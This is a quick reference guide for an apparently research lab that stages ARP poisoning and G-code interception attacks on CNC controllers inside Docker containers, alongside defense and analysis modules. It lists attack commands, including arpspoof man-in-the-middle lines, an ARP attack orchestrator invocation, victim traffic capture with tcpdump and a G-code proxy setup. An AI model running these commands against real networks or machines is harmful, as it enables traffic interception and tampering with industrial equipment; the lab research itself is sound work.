# Quick Reference Guide

## Common Commands

### Infrastructure Management

```bash
# Start the Docker infrastructure
cd infrastructure/docker
docker compose up -d

# Stop the infrastructure
docker compose down

# View running containers
docker ps

# View container logs
docker compose logs -f

# Restart a specific container
docker compose restart M-10.9.0.105
```

### Container Access

```bash
# Access HostA (victim/controller)
docker exec -it A-10.9.0.5 /bin/bash

# Access HostB (victim/target)
docker exec -it B-10.9.0.6 /bin/bash

# Access HostM (attacker/researcher)
docker exec -it M-10.9.0.105 /bin/bash
```

### ARP Attack Commands

```bash
# From HostM container - Basic ARP poisoning
cd /volumes
python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 --duration 120

# With packet capture disabled
python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 --no-capture

# Manual ARP spoofing (advanced)
arpspoof -i eth0 -t 10.9.0.5 10.9.0.6 &
arpspoof -i eth0 -t 10.9.0.6 10.9.0.5 &
```

### Network Monitoring

```bash
# From HostM - Capture traffic
tcpdump -i eth0 -w /volumes/capture.pcap host 10.9.0.5 or host 10.9.0.6

# View ARP cache
arp -n

# Monitor network traffic
tcpdump -i eth0 -n

# Check IP forwarding
cat /proc/sys/net/ipv4/ip_forward
```

### G-Code Attack Commands

```bash
# From host machine - Run attack simulator
cd scenarios/attack_modules
python3 attack_simulator.py

# Run G-code proxy
python3 gcode_proxy.py

# Run complete experiment
cd ../../scripts
python3 complete_experiment.py
```

### Data Analysis

```bash
# Generate report from experiment data
cd analysis
python3 generate_report.py --experiment ../data/archived_experiments/experiment_latest.json

# Start dashboard
python3 dashboard_enhanced.py
# Access at http://localhost:8050
```

### Troubleshooting

```bash
# Check Docker network
docker network inspect net-10.9.0.0

# View detailed container info
docker inspect M-10.9.0.105

# Check container resource usage
docker stats

# Force remove all containers and network
cd infrastructure/docker
docker compose down -v
docker compose up -d
```

## File Locations

| Purpose | Location |
|---------|----------|
| Docker config | `infrastructure/docker/docker-compose.yml` |
| Attack modules | `scenarios/attack_modules/*.py` |
| Defense modules | `scenarios/defense_modules/*.py` |
| Experiment data | `data/archived_experiments/*.json` |
| Analysis tools | `analysis/*.py` |
| Documentation | `docs/*.md` |

## Environment Variables

```bash
# Set CNC target
export CNC_IP="192.168.0.170"
export CNC_PORT="8080"

# Set proxy port
export PROXY_PORT="8888"

# Set output directory
export DATA_DIR="/data"
```

## Python Package Usage

```python
# Import attack simulator
from scenarios.attack_modules.attack_simulator import GCodeAttackSimulator

# Import defense system
from scenarios.defense_modules.prevention_modules import DefenseSystem

# Import research framework
from scenarios.research_framework import ResearchExperimentFramework

# Import data logger
from scenarios.research_scenarios import StatisticalDataLogger
```

## Quick Experiments

### Test 1: Verify ARP Poisoning
```bash
# Terminal 1 - Start infrastructure
cd infrastructure/docker && docker compose up -d

# Terminal 2 - Check initial ARP
docker exec -it A-10.9.0.5 arp -n

# Terminal 3 - Start attack
docker exec -it M-10.9.0.105 bash
cd /volumes
python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 --duration 60

# Terminal 2 - Verify ARP cache changed
docker exec -it A-10.9.0.5 arp -n
```

### Test 2: G-Code Interception
```bash
# On host machine with GRBL controller
cd scenarios/attack_modules
python3 gcode_proxy.py
# Configure your G-code sender to use proxy at 10.211.55.3:8888
```

## Important Notes

- Always run experiments in isolated networks
- Verify containers are healthy before experiments
- Save data frequently during long experiments
- Check disk space in `/data` regularly
- Review logs after each experiment

## Support

- Documentation: `docs/`
- Issues: GitHub Issues
- Questions: Open a Discussion

---

**Last Updated**: November 10, 2025
